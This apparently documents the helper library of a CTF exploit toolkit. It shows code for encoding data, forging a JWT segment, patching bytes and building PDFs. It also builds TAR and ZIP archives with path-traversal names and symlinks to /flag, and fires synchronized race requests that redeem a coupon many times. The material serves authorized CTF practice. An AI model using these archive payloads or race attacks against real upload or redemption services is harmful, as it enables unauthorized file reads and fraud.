# Payload helper cheatsheet

Helpers are separate from the exploit template. Run exploits from the toolkit
root or add that root to `PYTHONPATH`, then import the package for common
functions or one focused module:

```python
from helpers import make_tar, patch_bytes, pdf_to_text, race, upload_file

# Equivalent focused imports:
from helpers.archive_operations import make_tar
from helpers.file_operations import patch_bytes
```

Code that specifically needs the compatibility module can use:

```python
from helpers.payload_helpers import make_tar
```

## Data and multipart files

```python
from helpers.data_operations import (
    b64decode,
    b64encode,
    find_values,
    hexdecode,
    hexencode,
    random_string,
    upload_file,
    urlencode_form,
)

encoded = b64encode(b"payload")
jwt_segment = b64encode(b'{"admin":true}', urlsafe=True, strip_padding=True)
raw = b64decode(jwt_segment, urlsafe=True)
hex_payload = hexencode(b"\x00\xff")
form_body = urlencode_form({"name": "a b", "role": ["user", "admin"]})
values = find_values(response.json(), "token")

response = http.post(
    "/upload",
    data={"description": random_string()},
    files={"file": upload_file("payload.bin", b"\x00\xff")},
)
```

## Byte-level file construction

```python
from helpers.file_operations import (
    append_bytes,
    chunk_bytes,
    pad_bytes,
    patch_bytes,
    prepend_bytes,
    read_bytes,
    replace_bytes,
    write_bytes,
)

data = b"HEADER"                          # start with bytes
data = patch_bytes(data, 0x20, b"MARK")   # zero-pads through offset 0x20
data = prepend_bytes(data, b"PREFIX")
data = append_bytes(data, b"SUFFIX")
data = pad_bytes(data, 512)
data = replace_bytes(data, b"MARK", b"DATA")
blocks = chunk_bytes(data, 64)
write_bytes("/tmp/payload.bin", data)
copy = read_bytes("/tmp/payload.bin")
```

## TAR files, links, and custom paths

```python
from helpers.archive_operations import list_tar, make_tar

payload = make_tar(
    directories=["project"],
    files={
        "project/main.typ": '#raw(read("secret"))',
        "../outside.txt": b"custom traversal path",
    },
    symlinks={"project/secret": "/flag"},
    hardlinks={"project/second": "project/main.typ"},
    compression="gz",  # None, "gz", "bz2", or "xz"
)

log(list_tar(payload))
response = http.post(
    "/upload",
    files={"archive": ("payload.tar.gz", payload, "application/gzip")},
)
```

The helpers intentionally permit unusual names and links for authorized CTF
testing. Do not use them as a safe archive-extraction implementation.

## ZIP files and symlinks

```python
from helpers.archive_operations import list_zip, make_zip

payload = make_zip(
    directories=["files"],
    files={"main.typ": '#raw(read("files/secret"))'},
    symlinks={"files/secret": "/flag"},
)

log(list_zip(payload))
response = http.post(
    "/upload",
    files={"archive": ("payload.zip", payload, "application/zip")},
)
```

## Create and parse PDFs

```python
from helpers.pdf_operations import (
    append_pdf_bytes,
    make_minimal_pdf,
    pdf_info,
    pdf_to_text,
)

pdf = make_minimal_pdf("hello from exploit")
pdf = append_pdf_bytes(pdf, b"custom trailing bytes")

text = pdf_to_text(pdf)
info = pdf_info(pdf)
log(info, text)

response = http.post(
    "/upload",
    files={"document": ("payload.pdf", pdf, "application/pdf")},
)
```

`pdf_to_text()` and `pdf_info()` require `pypdf`; PDF creation itself uses only
the standard library.

## Poll an asynchronous job

```python
from helpers.race_operations import poll

result = poll(
    fetch=lambda: http.get(f"/jobs/{job_id}"),
    ready=lambda response: response.status_code != 202,
    timeout=10,
    interval=0.2,
)
write_output(result)
```

## Send synchronized race requests

Use a separate `requests.Session` per worker unless you have confirmed the
shared object is safe for your use. Prepare authentication before the barrier:

```python
import requests

from helpers.race_operations import race


def attempt(index):
    session = requests.Session()
    session.cookies.set("session", session_cookie)
    return session.post(
        f"{base_url}/redeem",
        data={"coupon": coupon},
        timeout=4,
    )


responses = race(attempt, attempts=20)
for response in responses:
    write_output(response)
```

For ordinary parallel work where simultaneous release is unnecessary:

```python
from helpers.race_operations import run_parallel

responses = run_parallel(fetch_one, flag_ids, workers=10)
```
